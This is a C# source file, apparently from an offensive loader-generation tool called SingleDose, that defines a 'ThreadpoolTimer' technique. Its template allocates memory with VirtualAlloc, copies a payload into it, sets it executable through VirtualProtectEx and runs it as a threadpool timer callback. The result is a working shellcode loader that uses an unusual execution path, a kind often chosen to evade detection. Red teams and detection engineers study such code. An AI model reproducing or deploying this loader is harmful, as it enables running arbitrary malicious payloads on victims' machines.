using System.Collections.Generic;

namespace SingleDose.Techniques.Loaders
{
    internal class ThreadpoolTimer : ITechnique
    {
        string ITechnique.TechniqueName => "ThreadpoolTimer";

        string ITechnique.TechniqueDescription => null;

        List<string> ITechnique.TechniqueReferences => new List<string>() 
        {
            @"https://github.com/Wra7h/FlavorTown"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => true;
        
        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "CreateThreadpoolTimer", "SetThreadpoolTimer", "WaitForThreadpoolTimerCallbacks", "CloseThreadpoolTimer" };
        
        List<string> ITechnique.Prerequisites => null;
        
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}
            LargeInteger lDueTime = new LargeInteger();
            FILETIME sFiletime = new FILETIME();
            lDueTime.QuadPart = -(10000000);
            sFiletime.DateTimeLow = (uint)lDueTime.Low;
            sFiletime.DateTimeHigh = (uint)lDueTime.High;

            IntPtr TPTimer = CreateThreadpoolTimer(hAlloc, IntPtr.Zero, IntPtr.Zero);
            SetThreadpoolTimer(TPTimer, ref sFiletime, 0, 0);

            System.Threading.Thread.Sleep(1500);

            WaitForThreadpoolTimerCallbacks(TPTimer, false);

            if (TPTimer != IntPtr.Zero)
            {
                CloseThreadpoolTimer(TPTimer);
            }
        }
        {{ARGS}}
        [StructLayout(LayoutKind.Sequential)]
        public struct FILETIME
        {
            public uint DateTimeLow;
            public uint DateTimeHigh;
        }

        [StructLayout(LayoutKind.Explicit)]
        private struct LargeInteger
        {
            [FieldOffset(0)]
            public int Low;
            [FieldOffset(4)]
            public int High;
            [FieldOffset(0)]
            public long QuadPart;
            public long ToInt64()
            {
                return ((long)this.High << 32) | (uint)this.Low;
            }

            public static LargeInteger FromInt64(long value)
            {
                return new LargeInteger
                {
                    Low = (int)(value),
                    High = (int)((value >> 32))
                };
            }
        }
        {{INVOKE}}
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
